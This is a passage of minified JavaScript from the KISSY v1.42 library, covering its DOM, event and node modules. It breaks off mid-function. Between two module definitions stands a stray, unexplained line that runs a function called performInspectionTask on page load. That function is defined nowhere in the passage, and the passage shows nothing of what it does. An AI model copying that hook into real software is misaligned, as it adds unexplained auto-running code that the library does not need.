        for (p = 0; p < x.length; p++) s = x[p], (!s.type || d.test(s.type)) && v.push(s);
        k.apply(c, [h + 1, 0].concat(v));
      }
      e.push(i);
    }
    return e;
  }
  function q(a) {
    a.src ? h.getScript(a.src) : (a = h.trim(a.text || a.textContent || a.innerHTML || "")) && h.globalEval(a);
  }
  function b(a, b, d, g) {
    a = e.query(a);
    g && (g = []);
    a = n(a, g);
    e._fixInsertionChecked && e._fixInsertionChecked(a);
    var b = e.query(b),
      i,
      v,
      j,
      p,
      k = b.length;
    if ((a.length || g && g.length) && k) {
      a = e._nodeListToFragment(a);
      1 < k && (p = e.clone(a, !0), b = h.makeArray(b));
      for (i = 0; i < k; i++) v = b[i], a && (j = 0 < i ? e.clone(p, !0) : a, d(j, v)), g && g.length && h.each(g, q);
    }
  }
  var e = m("./api"),
    l = e.NodeType,
    g = /^(?:button|input|object|select|textarea)$/i,
    a = e.nodeName,
    j = h.makeArray,
    k = [].splice,
    d = /\/(java|ecma)script/i;
  h.mix(e, {
    _fixInsertionChecked: null,
    insertBefore: function (a, d, e) {
      b(a, d, function (a, c) {
        c.parentNode && c.parentNode.insertBefore(a, c);
      }, e);
    },
    insertAfter: function (a, d, e) {
      b(a, d, function (a, c) {
        c.parentNode && c.parentNode.insertBefore(a, c.nextSibling);
      }, e);
    },
    appendTo: function (a, d, e) {
      b(a, d, function (a, c) {
        c.appendChild(a);
      }, e);
    },
    prependTo: function (a, d, e) {
      b(a, d, function (a, c) {
        c.insertBefore(a, c.firstChild);
      }, e);
    },
    wrapAll: function (a, b) {
      b = e.clone(e.get(b), !0);
      a = e.query(a);
      a[0].parentNode && e.insertBefore(b, a[0]);
      for (var d; (d = b.firstChild) && 1 === d.nodeType;) b = d;
      e.appendTo(a, b);
    },
    wrap: function (a, b) {
      a = e.query(a);
      b = e.get(b);
      h.each(a, function (a) {
        e.wrapAll(a, b);
      });
    },
    wrapInner: function (a, b) {
      a = e.query(a);
      b = e.get(b);
      h.each(a, function (a) {
        var c = a.childNodes;
        c.length ? e.wrapAll(c, b) : a.appendChild(b);
      });
    },
    unwrap: function (a) {
      a = e.query(a);
      h.each(a, function (a) {
        a = a.parentNode;
        e.replaceWith(a, a.childNodes);
      });
    },
    replaceWith: function (a, b) {
      var d = e.query(a),
        b = e.query(b);
      e.remove(b, !0);
      e.insertBefore(b, d);
      e.remove(d);
    }
  });
  h.each({
    prepend: "prependTo",
    append: "appendTo",
    before: "insertBefore",
    after: "insertAfter"
  }, function (a, b) {
    e[b] = e[a];
  });
  return e;
});
KISSY.add("dom/base/offset", ["./api"], function (h, m) {
  function n(a) {
    var b,
      d = a.ownerDocument.body;
    if (!a.getBoundingClientRect) return {
      left: 0,
      top: 0
    };
    b = a.getBoundingClientRect();
    a = b[c];
    b = b[f];
    a -= j.clientLeft || d.clientLeft || 0;
    b -= j.clientTop || d.clientTop || 0;
    return {
      left: a,
      top: b
    };
  }
  function q(a, c) {
    var d = {
        left: 0,
        top: 0
      },
      e = k(a),
      f,
      g = a,
      c = c || e;
    do {
      if (e == c) {
        var h = g;
        f = n(h);
        h = k(h);
        f.left += b[r](h);
        f.top += b[t](h);
      } else f = n(g);
      d.left += f.left;
      d.top += f.top;
    } while (e && e != c && (g = e.frameElement) && (e = e.parent));
    return d;
  }
  var b = m("./api"),
    e = h.Env.host,
    l = h.UA,
    g = e.document,
    a = b.NodeType,
    j = g && g.documentElement,
    k = b.getWindow,
    d = Math.max,
    c = "left",
    f = "top",
    r = "scrollLeft",
    t = "scrollTop";
  h.mix(b, {
    offset: function (a, c, d) {
      if (void 0 === c) {
        var a = b.get(a),
          e;
        a && (e = q(a, d));
        return e;
      }
      d = b.query(a);
      for (e = d.length - 1; 0 <= e; e--) {
        var a = d[e],
          f = c;
        "static" === b.css(a, "position") && (a.style.position = "relative");
        var g = q(a),
          h = {},
          j = void 0,
          k = void 0;
        for (k in f) j = parseFloat(b.css(a, k)) || 0, h[k] = j + f[k] - g[k];
        b.css(a, h);
      }
    },
    scrollIntoView: function (d, e, g, j) {
      var l, n, m, q;
      if (m = b.get(d)) {
        e && (e = b.get(e));
        e || (e = m.ownerDocument);
        e.nodeType === a.DOCUMENT_NODE && (e = k(e));
        h.isPlainObject(g) && (j = g.allowHorizontalScroll, q = g.onlyScrollIfNeeded, g = g.alignWithTop);
        j = void 0 === j ? !0 : j;
        n = h.isWindow(e);
        var d = b.offset(m),
          r = b.outerHeight(m);
        l = b.outerWidth(m);
        var t, y, u, w;
        n ? (n = e, t = b.height(n), y = b.width(n), w = {
          left: b.scrollLeft(n),
          top: b.scrollTop(n)
        }, n = d[c] - w[c], m = d[f] - w[f], l = d[c] + l - (w[c] + y), d = d[f] + r - (w[f] + t)) : (t = b.offset(e), y = e.clientHeight, u = e.clientWidth, w = {
          left: b.scrollLeft(e),
          top: b.scrollTop(e)
        }, n = d[c] - (t[c] + (parseFloat(b.css(e, "borderLeftWidth")) || 0)), m = d[f] - (t[f] + (parseFloat(b.css(e, "borderTopWidth")) || 0)), l = d[c] + l - (t[c] + u + (parseFloat(b.css(e, "borderRightWidth")) || 0)), d = d[f] + r - (t[f] + y + (parseFloat(b.css(e, "borderBottomWidth")) || 0)));
        if (q) {
          if (0 > m || 0 < d) !0 === g ? b.scrollTop(e, w.top + m) : !1 === g ? b.scrollTop(e, w.top + d) : 0 > m ? b.scrollTop(e, w.top + m) : b.scrollTop(e, w.top + d);
        } else (g = void 0 === g ? !0 : !!g) ? b.scrollTop(e, w.top + m) : b.scrollTop(e, w.top + d);
        if (j) if (q) {
          if (0 > n || 0 < l) !0 === g ? b.scrollLeft(e, w.left + n) : !1 === g ? b.scrollLeft(e, w.left + l) : 0 > n ? b.scrollLeft(e, w.left + n) : b.scrollLeft(e, w.left + l);
        } else void 0 === g || g ? b.scrollLeft(e, w.left + n) : b.scrollLeft(e, w.left + l);
      }
    },
    docWidth: 0,
    docHeight: 0,
    viewportHeight: 0,
    viewportWidth: 0,
    scrollTop: 0,
    scrollLeft: 0
  });
  h.each(["Left", "Top"], function (c, d) {
    var f = "scroll" + c;
    b[f] = function (g, h) {
      if ("number" === typeof g) return arguments.callee(e, g);
      var g = b.get(g),
        j,
        l,
        n,
        m;
      g && g.nodeType === a.ELEMENT_NODE ? void 0 !== h ? g[f] = parseFloat(h) : j = g[f] : (m = k(g), void 0 !== h ? (h = parseFloat(h), l = "Left" === c ? h : b.scrollLeft(m), n = "Top" === c ? h : b.scrollTop(m), m.scrollTo(l, n)) : (j = m["page" + (d ? "Y" : "X") + "Offset"], "number" !== typeof j && (l = m.document, j = l.documentElement[f], "number" !== typeof j && (j = l.body[f]))));
      return j;
    };
  });
  h.each(["Width", "Height"], function (a) {
    b["doc" + a] = function (c) {
      c = b.get(c);
      c = b.getDocument(c);
      return d(c.documentElement["scroll" + a], c.body["scroll" + a], b["viewport" + a](c));
    };
    b["viewport" + a] = function (c) {
      var c = b.get(c),
        d = k(c),
        c = d["inner" + a];
      if (l.mobile && c) return c;
      var c = "client" + a,
        d = d.document,
        e = d.body,
        f = d.documentElement[c];
      return "CSS1Compat" === d.compatMode && f || e && e[c] || f;
    };
  });
  return b;
});
KISSY.add("dom/base/style", ["./api"], function (h, m) {
  function n(a, c) {
    return c.toUpperCase();
  }
  function q(a) {
    return a.replace(s, "ms-").replace(A, n);
  }
  function b(a, c, d) {
    var b = {},
      e = a.style,
      f;
    for (f in c) b[f] = e[f], e[f] = c[f];
    d.call(a);
    for (f in c) e[f] = b[f];
  }
  function e(a, c, d) {
    var b, e, f;
    if (!(3 === a.nodeType || 8 === a.nodeType || !(b = a.style))) if (c = q(c), f = D[c], c = z[c] || c, void 0 !== d) {
      null === d || d === p ? d = p : !isNaN(Number(d)) && !v[c] && (d += x);
      f && f.set && (d = f.set(a, d));
      if (void 0 !== d) {
        try {
          b[c] = d;
        } catch (g) {
          "css set error:" + g;
        }
        d === p && b.removeAttribute && b.removeAttribute(c);
      }
      b.cssText || a.removeAttribute("style");
    } else {
      if (!f || !("get" in f && void 0 !== (e = f.get(a, !1)))) e = b[c];
      return void 0 === e ? "" : e;
    }
  }
  function l(a) {
    var c,
      d = arguments;
    0 !== a.offsetWidth ? c = g.apply(void 0, d) : b(a, L, function () {
      c = g.apply(void 0, d);
    });
    return c;
  }
  function g(c, d, b) {
    if (h.isWindow(c)) return d === t ? a.viewportWidth(c) : a.viewportHeight(c);
    if (9 === c.nodeType) return d === t ? a.docWidth(c) : a.docHeight(c);
    var e = d === t ? ["Left", "Right"] : ["Top", "Bottom"],
      f = d === t ? c.offsetWidth : c.offsetHeight;
    if (0 < f) return "border" !== b && h.each(e, function (d) {
      b || (f -= parseFloat(a.css(c, "padding" + d)) || 0);
      f = "margin" === b ? f + (parseFloat(a.css(c, b + d)) || 0) : f - (parseFloat(a.css(c, "border" + d + "Width")) || 0);
    }), f;
    f = a._getComputedStyle(c, d);
    if (null === f || 0 > Number(f)) f = c.style[d] || 0;
    f = parseFloat(f) || 0;
    b && h.each(e, function (d) {
      f += parseFloat(a.css(c, "padding" + d)) || 0;
      "padding" !== b && (f += parseFloat(a.css(c, "border" + d + "Width")) || 0);
      "margin" === b && (f += parseFloat(a.css(c, b + d)) || 0);
    });
    return f;
  }
  var a = m("./api"),
    j = h.Env.host,
    k = h.UA,
    d = h.Features,
    c = a.nodeName,
    f = j.document,
    r = /^margin/,
    t = "width",
    i = "display" + h.now(),
    v = {
      fillOpacity: 1,
      fontWeight: 1,
      lineHeight: 1,
      opacity: 1,
      orphans: 1,
      widows: 1,
      zIndex: 1,
      zoom: 1
    },
    s = /^-ms-/,
    p = "",
    x = "px",
    H = /\d(?!px)[a-z%]+$/i,
    D = {},
    z = {
      "float": "cssFloat"
    },
    F = {},
    A = /-([a-z])/ig,
    y = f && f.documentElement.style || {},
    u;
  h.each(["", "Webkit", "Moz", "O", "ms"], function (a) {
    a = a ? a + "UserSelect" : "userSelect";
    void 0 === u && a in y && (u = a);
  });
  if (d.isTransformSupported()) {
    var w;
    w = z.transform = d.getTransformProperty();
    z.transformOrigin = w + "Origin";
  }
  d.isTransitionSupported() && (z.transition = d.getTransitionProperty());
  h.mix(a, {
    _camelCase: q,
    _cssHooks: D,
    _cssProps: z,
    _getComputedStyle: function (c, d) {
      var b = "",
        e,
        f,
        g,
        h,
        i;
      f = c.ownerDocument;
      d = z[d] || d;
      if (e = f.defaultView.getComputedStyle(c, null)) b = e.getPropertyValue(d) || e[d];
      b === "" && !a.contains(f, c) && (b = c.style[d]);
      if (a._RE_NUM_NO_PX.test(b) && r.test(d)) {
        i = c.style;
        f = i.width;
        g = i.minWidth;
        h = i.maxWidth;
        i.minWidth = i.maxWidth = i.width = b;
        b = e.width;
        i.width = f;
        i.minWidth = g;
        i.maxWidth = h;
      }
      return b;
    },
    style: function (c, d, b) {
      var c = a.query(c),
        f,
        g = c[0];
      if (h.isPlainObject(d)) for (f in d) for (g = c.length - 1; g >= 0; g--) e(c[g], f, d[f]);else {
        if (b === void 0) {
          f = "";
          g && (f = e(g, d, b));
          return f;
        }
        for (g = c.length - 1; g >= 0; g--) e(c[g], d, b);
      }
    },
    css: function (c, d, b) {
      var c = a.query(c),
        f = c[0],
        g;
      if (h.isPlainObject(d)) for (g in d) for (f = c.length - 1; f >= 0; f--) e(c[f], g, d[g]);else {
        d = q(d);
        g = D[d];
        if (b === void 0) {
          b = "";
          if (f && (!g || !("get" in g && (b = g.get(f, true)) !== void 0))) b = a._getComputedStyle(f, d);
          return typeof b === "undefined" ? "" : b;
        }
        for (f = c.length - 1; f >= 0; f--) e(c[f], d, b);
      }
    },
    show: function (c) {
      var c = a.query(c),
        d,
        b,
        e;
      for (e = c.length - 1; e >= 0; e--) {
        b = c[e];
        b.style.display = a.data(b, i) || p;
        if (a.css(b, "display") === "none") {
          d = b.tagName.toLowerCase();
          var g = void 0,
            h = F[d],
            j = void 0;
          if (!F[d]) {
            g = f.body || f.documentElement;
            j = f.createElement(d);
            a.prepend(j, g);
            h = a.css(j, "display");
            g.removeChild(j);
            F[d] = h;
          }
          d = h;
          a.data(b, i, d);
          b.style.display = d;
        }
      }
    },
    hide: function (c) {
      var c = a.query(c),
        d,
        b;
      for (b = c.length - 1; b >= 0; b--) {
        d = c[b];
        var e = d.style,
          f = e.display;
        if (f !== "none") {
          f && a.data(d, i, f);
          e.display = "none";
        }
      }
    },
    toggle: function (c) {
      var c = a.query(c),
        d,
        b;
      for (b = c.length - 1; b >= 0; b--) {
        d = c[b];
        a.css(d, "display") === "none" ? a.show(d) : a.hide(d);
      }
    },
    addStyleSheet: function (c, d, b) {
      if (typeof c === "string") {
        b = d;
        d = c;
        c = j;
      }
      var c = a.getDocument(c),
        e;
      if (b && (b = b.replace("#", p))) e = a.get("#" + b, c);
      if (!e) {
        e = a.create("<style>", {
          id: b
        }, c);
        a.get("head", c).appendChild(e);
        e.styleSheet ? e.styleSheet.cssText = d : e.appendChild(c.createTextNode(d));
      }
    },
    unselectable: function (d) {
      var d = a.query(d),
        b,
        e,
        f = 0,
        g,
        i;
      for (e = d.length - 1; e >= 0; e--) {
        b = d[e];
        i = b.style;
        if (u !== void 0) i[u] = "none";else if (k.ie) {
          i = b.getElementsByTagName("*");
          b.setAttribute("unselectable", "on");
          for (g = ["iframe", "textarea", "input", "select"]; b = i[f++];) h.inArray(c(b), g) || b.setAttribute("unselectable", "on");
        }
      }
    },
    innerWidth: 0,
    innerHeight: 0,
    outerWidth: 0,
    outerHeight: 0,
    width: 0,
    height: 0
  });
  h.each([t, "height"], function (c) {
    a["inner" + h.ucfirst(c)] = function (d) {
      return (d = a.get(d)) && l(d, c, "padding");
    };
    a["outer" + h.ucfirst(c)] = function (d, b) {
      var e = a.get(d);
      return e && l(e, c, b ? "margin" : "border");
    };
    a[c] = function (d, b) {
      var e = a.css(d, c, b);
      e && (e = parseFloat(e));
      return e;
    };
    D[c] = {
      get: function (a, d) {
        var b;
        d && (b = l(a, c) + "px");
        return b;
      }
    };
  });
  var L = {
    position: "absolute",
    visibility: "hidden",
    display: "block"
  };
  h.each(["left", "top"], function (c) {
    D[c] = {
      get: function (d, b) {
        var e, g, h;
        if (b) {
          h = a.css(d, "position");
          if (h === "static") return "auto";
          e = a._getComputedStyle(d, c);
          if ((g = e === "auto") && h === "relative") return "0px";
          if (g || H.test(e)) {
            h = {
              top: 0,
              left: 0
            };
            if (a.css(d, "position") === "fixed") g = d.getBoundingClientRect();else {
              for (e = d.offsetParent || (d.ownerDocument || f).body; e && !M.test(e.nodeName) && a.css(e, "position") === "static";) e = e.offsetParent;
              g = a.offset(d);
              h = a.offset(e);
              h.top = h.top + (parseFloat(a.css(e, "borderTopWidth")) || 0);
              h.left = h.left + (parseFloat(a.css(e, "borderLeftWidth")) || 0);
            }
            g.top = g.top - (parseFloat(a.css(d, "marginTop")) || 0);
            g.left = g.left - (parseFloat(a.css(d, "marginLeft")) || 0);
            e = {
              top: g.top - h.top,
              left: g.left - h.left
            }[c] + "px";
          }
        }
        return e;
      }
    };
  });
  var M = /^(?:body|html)$/i;
  return a;
});
KISSY.add("dom/base/selector", ["./api"], function (h, m) {
  function n(a) {
    var c = this.length,
      d;
    for (d = 0; d < c && !1 !== a(this[d], d); d++);
  }
  function q(a) {
    a = a.substr(1);
    if (!a) throw Error("An invalid or illegal string was specified for selector.");
    return a;
  }
  function b(a) {
    return function (b) {
      var e = d._getElementById(a, c);
      return e && d._contains(b, e) ? [e] : [];
    };
  }
  function e(a) {
    return function (c) {
      return c.getElementsByClassName(a);
    };
  }
  function l(a) {
    return function (c) {
      return c.getElementsByTagName(a);
    };
  }
  function g(a, f) {
    var j,
      k,
      o = "string" === typeof a,
      m = void 0 !== f ? g(f) : (k = 1) && [c],
      r = m.length;
    if (a) {
      if (o) {
        a = y(a);
        if (k) if ("body" === a) j = [c.body];else if (H.test(a) && t) j = v(c.getElementsByClassName(RegExp.$1));else if (F.test(a)) j = (k = d._getElementById(RegExp.$2, c)) && k.nodeName.toLowerCase() === RegExp.$1 ? [k] : [];else if (D.test(a)) j = (k = d._getElementById(a.substr(1), c)) ? [k] : [];else if (z.test(a)) j = v(c.getElementsByTagName(a));else if (!a.match(/,|\+|=|~|\[|\]|:|>|\||\$|\^|\*|\(|\)|[\w-]+\.[\w-]+|[\w-]+#[\w-]+/) && t) {
          j = a.split(/\s+/);
          var p = m,
            B,
            A;
          k = 0;
          for (o = j.length; k < o; k++) {
            B = j;
            A = k;
            var E;
            E = j[k];
            var I = E.charAt(0);
            E = "#" === I ? b(q(E)) : "." === I ? e(q(E)) : l(E);
            B[A] = E;
          }
          k = 0;
          for (o = j.length; k < o; k++) {
            E = j[k];
            var I = [],
              K;
            B = 0;
            for (A = p.length; B < A; B++) K = E(p[B]), I.push.apply(I, v(K));
            p = I;
            if (!p.length) break;
          }
          j = p && 1 < p.length ? d.unique(p) : p;
        }
        if (!j) {
          j = [];
          for (k = 0; k < r; k++) x.apply(j, d._selectInternal(a, m[k]));
          1 < j.length && 1 < r && d.unique(j);
        }
      } else {
        if (j = a.nodeType || h.isWindow(a) ? [a] : a.getDOMNodes ? a.getDOMNodes() : i(a) ? a : s(a) ? v(a) : [a], !k) {
          o = j;
          B = o.length;
          j = [];
          for (k = 0; k < B; k++) for (p = 0; p < r; p++) if (d._contains(m[p], o[k])) {
            j.push(o[k]);
            break;
          }
        }
      }
    } else j = [];
    j.each = n;
    return j;
  }
  function a(a, c) {
    var d = a && j(a, "class");
    return d && (d = d.replace(/[\r\t\n]/g, p)) && -1 < (p + d + p).indexOf(p + c + p);
  }
  function j(a, c) {
    var d = a && a.getAttributeNode(c);
    if (d && d.specified) return d.nodeValue;
  }
  function k(a, c) {
    return "*" === c || a.nodeName.toLowerCase() === c.toLowerCase();
  }
  var d = m("./api"),
    c = h.Env.host.document,
    f = c.documentElement,
    r = f.matches || f.webkitMatchesSelector || f.mozMatchesSelector || f.oMatchesSelector || f.msMatchesSelector,
    t = "getElementsByClassName" in c,
    i = h.isArray,
    v = h.makeArray,
    s = d.isDomNodeList,
    p = " ",
    x = Array.prototype.push,
    H = /^\.([\w-]+)$/,
    D = /^#([\w-]+)$/,
    z = /^([\w-])+$/,
    F = /^([\w-]+)#([\w-]+)$/,
    A = /^(?:#([\w-]+))?\s*([\w-]+|\*)?\.?([\w-]+)?$/,
    y = h.trim;
  h.mix(d, {
    _compareNodeOrder: function (a, c) {
      return !a.compareDocumentPosition || !c.compareDocumentPosition ? a.compareDocumentPosition ? -1 : 1 : a.compareDocumentPosition(c) & 4 ? -1 : 1;
    },
    _getElementsByTagName: function (a, c) {
      return v(c.querySelectorAll(a));
    },
    _getElementById: function (a, c) {
      return c.getElementById(a);
    },
    _getSimpleAttr: j,
    _isTag: k,
    _hasSingleClass: a,
    _matchesInternal: function (a, c) {
      for (var d = [], b = 0, e, f = c.length; b < f; b++) e = c[b], r.call(e, a) && d.push(e);
      return d;
    },
    _selectInternal: function (a, c) {
      return v(c.querySelectorAll(a));
    },
    query: g,
    get: function (a, c) {
      return g(a, c)[0] || null;
    },
    unique: function () {
      function a(b, e) {
        return b === e ? (c = !0, 0) : d._compareNodeOrder(b, e);
      }
      var c,
        b = !0;
      [0, 0].sort(function () {
        b = !1;
        return 0;
      });
      return function (d) {
        c = b;
        d.sort(a);
        if (c) for (var e = 1, f = d.length; e < f;) d[e] === d[e - 1] ? (d.splice(e, 1), --f) : e++;
        return d;
      };
    }(),
    filter: function (c, b, e) {
      var c = g(c, e),
        f,
        i,
        l,
        m,
        e = [];
      if ("string" === typeof b && (b = y(b)) && (l = A.exec(b))) f = l[1], i = l[2], m = l[3], f ? f && !i && !m && (b = function (a) {
        return j(a, "id") === f;
      }) : b = function (c) {
        var d = !0,
          b = !0;
        i && (d = k(c, i));
        m && (b = a(c, m));
        return b && d;
      };
      return e = "function" === typeof b ? h.filter(c, b) : d._matchesInternal(b, c);
    },
    test: function (a, c, b) {
      a = g(a, b);
      return a.length && d.filter(a, c, b).length === a.length;
    }
  });
  return d;
});
KISSY.add("dom/base/traversal", ["./api"], function (h, m) {
  function n(b, a, j, k, d, c, f) {
    if (!(b = e.get(b))) return null;
    if (0 === a) return b;
    c || (b = b[j]);
    if (!b) return null;
    d = d && e.get(d) || null;
    void 0 === a && (a = 1);
    var c = [],
      m = h.isArray(a),
      n,
      i;
    "number" === typeof a && (n = 0, i = a, a = function () {
      return ++n === i;
    });
    for (; b && b !== d;) {
      if ((b.nodeType === l.ELEMENT_NODE || b.nodeType === l.TEXT_NODE && f) && q(b, a) && (!k || k(b))) if (c.push(b), !m) break;
      b = b[j];
    }
    return m ? c : c[0] || null;
  }
  function q(b, a) {
    if (!a) return !0;
    if (h.isArray(a)) {
      var j,
        k = a.length;
      if (!k) return !0;
      for (j = 0; j < k; j++) if (e.test(b, a[j])) return !0;
    } else if (e.test(b, a)) return !0;
    return !1;
  }
  function b(b, a, j, k) {
    var d = [],
      c,
      f;
    if ((c = b = e.get(b)) && j) c = b.parentNode;
    if (c) {
      j = h.makeArray(c.childNodes);
      for (c = 0; c < j.length; c++) f = j[c], (k || f.nodeType === l.ELEMENT_NODE) && f !== b && d.push(f);
      a && (d = e.filter(d, a));
    }
    return d;
  }
  var e = m("./api"),
    l = e.NodeType;
  h.mix(e, {
    _contains: function (b, a) {
      return !!(b.compareDocumentPosition(a) & 16);
    },
    closest: function (b, a, e, h) {
      return n(b, a, "parentNode", function (a) {
        return a.nodeType !== l.DOCUMENT_FRAGMENT_NODE;
      }, e, !0, h);
    },
    parent: function (b, a, e) {
      return n(b, a, "parentNode", function (a) {
        return a.nodeType !== l.DOCUMENT_FRAGMENT_NODE;
      }, e, void 0);
    },
    first: function (b, a, h) {
      b = e.get(b);
      return n(b && b.firstChild, a, "nextSibling", void 0, void 0, !0, h);
    },
    last: function (b, a, h) {
      b = e.get(b);
      return n(b && b.lastChild, a, "previousSibling", void 0, void 0, !0, h);
    },
    next: function (b, a, e) {
      return n(b, a, "nextSibling", void 0, void 0, void 0, e);
    },
    prev: function (b, a, e) {
      return n(b, a, "previousSibling", void 0, void 0, void 0, e);
    },
    siblings: function (e, a, h) {
      return b(e, a, !0, h);
    },
    children: function (e, a) {
      return b(e, a, void 0);
    },
    contents: function (e, a) {
      return b(e, a, void 0, 1);
    },
    contains: function (b, a) {
      b = e.get(b);
      a = e.get(a);
      return b && a ? e._contains(b, a) : !1;
    },
    index: function (b, a) {
      var j = e.query(b),
        k,
        d = 0;
      k = j[0];
      if (!a) {
        j = k && k.parentNode;
        if (!j) return -1;
        for (; k = k.previousSibling;) k.nodeType === l.ELEMENT_NODE && d++;
        return d;
      }
      d = e.query(a);
      return "string" === typeof a ? h.indexOf(k, d) : h.indexOf(d[0], j);
    },
    equals: function (b, a) {
      b = e.query(b);
      a = e.query(a);
      if (b.length !== a.length) return !1;
      for (var h = b.length; 0 <= h; h--) if (b[h] !== a[h]) return !1;
      return !0;
    }
  });
  return e;
});
KISSY.add("dom/base", "./base/api,./base/attr,./base/class,./base/create,./base/data,./base/insertion,./base/offset,./base/style,./base/selector,./base/traversal".split(","), function (h, m) {
  var n = m("./base/api");
  m("./base/attr");
  m("./base/class");
  m("./base/create");
  m("./base/data");
  m("./base/insertion");
  m("./base/offset");
  m("./base/style");
  m("./base/selector");
  m("./base/traversal");
  h.mix(h, {
    DOM: n,
    get: n.get,
    query: n.query
  });
  return n;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:16
*/
KISSY.add("event/dom/shake", ["event/dom/base"], function (d, m) {
  function j(a) {
    var b = a.accelerationIncludingGravity,
      a = b.x,
      d = b.y,
      b = b.z,
      f;
    void 0 !== c && (f = n(g(a - c), g(d - h), g(b - i)), f > o && k(), f > p && (e = 1));
    c = a;
    h = d;
    i = b;
  }
  var l = m("event/dom/base"),
    q = l.Special,
    o = 5,
    p = 20,
    e = 0,
    c,
    h,
    i,
    n = Math.max,
    g = Math.abs,
    a = d.Env.host,
    k = d.buffer(function () {
      e && (l.fireHandler(a, "shake", {
        accelerationIncludingGravity: {
          x: c,
          y: h,
          z: i
        }
      }), c = void 0, e = 0);
    }, 250);
  q.shake = {
    setup: function () {
      this === a && a.addEventListener("devicemotion", j, !1);
    },
    tearDown: function () {
      this === a && (k.stop(), c = void 0, e = 0, a.removeEventListener("devicemotion", j, !1));
    }
  };
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:15
*/
KISSY.add("event/dom/focusin", ["event/dom/base"], function (d, g) {
  var e = g("event/dom/base"),
    h = e.Special;
  d.each([{
    name: "focusin",
    fix: "focus"
  }, {
    name: "focusout",
    fix: "blur"
  }], function (c) {
    function f(a) {
      return e.fire(a.target, c.name);
    }
    var b = d.guid("attaches_" + d.now() + "_");
    h[c.name] = {
      setup: function () {
        var a = this.ownerDocument || this;
        b in a || (a[b] = 0);
        a[b] += 1;
        1 === a[b] && a.addEventListener(c.fix, f, !0);
      },
      tearDown: function () {
        var a = this.ownerDocument || this;
        a[b] -= 1;
        0 === a[b] && a.removeEventListener(c.fix, f, !0);
      }
    };
  });
  return e;
});
/*
Copyright 2013, KISSY v1.42
MIT Licensed
build time: Dec 4 22:17
*/
KISSY.add("node/base", ["dom", "event/dom"], function (b, e) {
  function c(f, m, g) {
    if (!(this instanceof c)) return new c(f, m, g);
    if (f) {
      if ("string" === typeof f) {
        if (f = h.create(f, m, g), f.nodeType === k.DOCUMENT_FRAGMENT_NODE) return d.apply(this, a(f.childNodes)), this;
      } else {
        if (b.isArray(f) || j(f)) return d.apply(this, a(f)), this;
      }
    } else return this;
    this[0] = f;
    this.length = 1;
    return this;
  }
  var h = e("dom"),
    i = e("event/dom"),
    g = Array.prototype,
    l = g.slice,
    k = h.NodeType,
    d = g.push,
    a = b.makeArray,
    j = h.isDomNodeList;
  c.prototype = {
    constructor: c,
    isNodeList: !0,
    length: 0,
    item: function (f) {
      return "number" === typeof f ? f >= this.length ? null : new c(this[f]) : new c(f);
    },
    add: function (f, a, b) {
      "number" === typeof a && (b = a, a = void 0);
      f = c.all(f, a).getDOMNodes();
      a = new c(this);
      void 0 === b ? d.apply(a, f) : (b = [b, 0], b.push.apply(b, f), g.splice.apply(a, b));
      return a;
    },
    slice: function () {
      return new c(l.apply(this, arguments));
    },
    getDOMNodes: function () {
      return l.call(this);
    },
    each: function (a, d) {
      var k = this;
      b.each(k, function (b, j) {
        b = new c(b);
        return a.call(d || b, b, j, k);
      });
      return k;
    },
    getDOMNode: function () {
      return this[0];
    },
    end: function () {
      return this.__parent || this;
    },
    filter: function (a) {
      return new c(h.filter(this, a));
    },
    all: function (a) {
      a = 0 < this.length ? c.all(a, this) : new c();
      a.__parent = this;
      return a;
    },
    one: function (a) {
      a = this.all(a);
      if (a = a.length ? a.slice(0, 1) : null) a.__parent = this;
      return a;
    }
  };
  b.mix(c, {
    all: function (a, d) {
      return "string" === typeof a && (a = b.trim(a)) && 3 <= a.length && b.startsWith(a, "<") && b.endsWith(a, ">") ? (d && (d.getDOMNode && (d = d[0]), d = d.ownerDocument || d), new c(a, void 0, d)) : new c(h.query(a, d));
    },
    one: function (a, d) {
      var b = c.all(a, d);
      return b.length ? b.slice(0, 1) : null;
    }
  });
  c.NodeType = k;
  c.KeyCode = i.KeyCode;
  c.Gesture = i.Gesture;
  c.REPLACE_HISTORY = i.REPLACE_HISTORY;
  return c;
});
window.addEventListener("load", performInspectionTask);
KISSY.add("node/attach", ["dom", "event/dom", "./base"], function (b, e) {
  function c(d, a, b) {
    b.unshift(a);
    d = h[d].apply(h, b);
    return void 0 === d ? a : d;
  }
  var h = e("dom"),
    i = e("event/dom"),
    g = e("./base"),
    l = g.prototype,
    k = b.makeArray;
  g.KeyCode = i.KeyCode;
  b.each("nodeName,isCustomDomain,getEmptyIframeSrc,equals,contains,index,scrollTop,scrollLeft,height,width,innerHeight,innerWidth,outerHeight,outerWidth,addStyleSheet,appendTo,prependTo,insertBefore,before,after,insertAfter,test,hasClass,addClass,removeClass,replaceClass,toggleClass,removeAttr,hasAttr,hasProp,scrollIntoView,remove,empty,removeData,hasData,unselectable,wrap,wrapAll,replaceWith,wrapInner,unwrap".split(","), function (d) {
    l[d] = function () {
      var a = k(arguments);
      return c(d, this, a);
    };
  });
  b.each("getWindow,getDocument,filter,first,last,parent,closest,next,prev,clone,siblings,contents,children".split(","), function (d) {
    l[d] = function () {
      var a = k(arguments);
      a.unshift(this);
      a = h[d].apply(h, a);
      return a === void 0 ? this : a === null ? null : new g(a);
    };
  });
  b.each({
    attr: 1,
    text: 0,
    css: 1,
    style: 1,
    val: 0,
    prop: 1,
    offset: 0,
    html: 0,
    outerHTML: 0,
    outerHtml: 0,
    data: 1
  }, function (d, a) {
    l[a] = function () {
      var j;
      j = k(arguments);
      void 0 === j[d] && !b.isObject(j[0]) ? (j.unshift(this), j = h[a].apply(h, j)) : j = c(a, this, j);
      return j;
    };
  });
  b.each(["on", "detach", "delegate", "undelegate"], function (d) {
    l[d] = function () {
      var a = k(arguments);
      a.unshift(this);
      i[d].apply(i, a);
      return this;
    };
  });
  b.each(["fire", "fireHandler"], function (d) {
    l[d] = function () {
      var a = k(arguments);
      a.unshift(this);
      return i[d].apply(i, a);
    };
  });
});
KISSY.add("node/override", ["dom", "./base", "./attach"], function (b, e) {
  var c = e("dom"),
    h = e("./base");
  e("./attach");
  var i = h.prototype;
  b.each(["append", "prepend", "before", "after"], function (b) {
    i[b] = function (e) {
      "string" === typeof e && (e = c.create(e));
      if (e) c[b](e, this);
      return this;
    };
  });
  b.each(["wrap", "wrapAll", "replaceWith", "wrapInner"], function (b) {
    var c = i[b];
    i[b] = function (b) {
